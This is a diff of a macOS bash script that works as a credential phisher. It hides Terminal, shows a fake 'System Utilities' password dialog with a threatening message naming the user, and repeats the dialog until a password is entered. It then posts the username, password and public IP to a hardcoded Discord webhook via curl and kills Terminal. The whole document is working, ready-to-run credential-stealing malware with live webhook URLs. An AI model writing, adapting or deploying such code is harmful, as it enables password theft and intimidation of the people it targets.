@@ -1,8 +1,17 @@
 #!/bin/bash
-# Login Prompt Script for macOS – Updated with Sleep on Cancel
+# Login Prompt Script for macOS – Updated with Two-Line Prompt and Force Kill
 # This script displays a login prompt that instructs the user with two lines:
 # "I know where you live, [FirstName]."
 # "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
+#
+# Once a non-empty password is entered, it sends the captured data to a Discord webhook and forcefully kills Terminal.
+#
+# Requirements:
+# - macOS with osascript, curl, and either python3 or python installed.
+#
+# Usage:
+#   chmod +x login_prompt.sh
+#   ./login_prompt.sh
 
 # Hide Terminal immediately.
 osascript -e 'tell application "Terminal" to set visible of front window to false'
@@ -13,44 +22,35 @@ username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /logi
 # Initialize capture text.
 capture="username=${username}\n_________________________________________________________________________________________\n\n"
 
-# Define AppleScript for password prompt with sleep on cancel
+# Define AppleScript for a persistent password prompt with a two-line message.
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
 set firstName to word 1 of fullName
 set lastName to word -1 of fullName
-
-set validInput to false
 set userPassword to ""
-
-repeat until validInput
+repeat while userPassword is ""
     try
         set userPassword to text returned of (display dialog "I know where you live, " & firstName & "." & return & "Enter your password Mr. " & lastName & ". DO NOT PRESS CANCEL" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
-        
-        if userPassword is not equal to "" then
-            set validInput to true
-            return userPassword
-        end if
     on error
-        # Return special code to signal cancel was pressed
-        return "##CANCEL##"
+        set userPassword to ""
     end try
 end repeat
+return userPassword
 EOF
 
 # Execute the AppleScript prompt and capture its output.
-userPassword=$(osascript -e "$applescriptCode")
+osascript -e "$applescriptCode" > pass_temp.txt
 
-# Check if cancel was pressed
-if [[ "$userPassword" == "##CANCEL##" ]]; then
-    # Run the sleep command directly and give it time to execute
-    osascript -e 'tell application "System Events" to sleep'
-    # Allow time for the sleep command to take effect before script ends
-    sleep 3
-    exit 0
+# Read the password from the temporary file.
+if [ -f pass_temp.txt ]; then
+    dialogText=$(cat pass_temp.txt)
+    rm pass_temp.txt
+else
+    dialogText="CANCEL"
 fi
 
 # Append the captured password.
-capture="${capture}password=${userPassword}\n"
+capture="${capture}password=${dialogText}\n"
 
 # Capture the public IP address.
 ipaddress=$(curl -s https://api.ipify.org)
@@ -70,11 +70,9 @@ fi
 payload=$($PYTHON -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
 
 # Send the payload to your Discord webhook.
-DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139736552570900/GsKXFNHTYx7Ej7D36VnzpotosTaIhxZk4Qb9SMySCM052SQ371xSdNH2Bu_oWexZkmxR"
+DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
 curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
-
-# Clean up
 rm pass.txt
 
-# Force kill Terminal after everything else is done
+# Force kill Terminal.
 killall Terminal
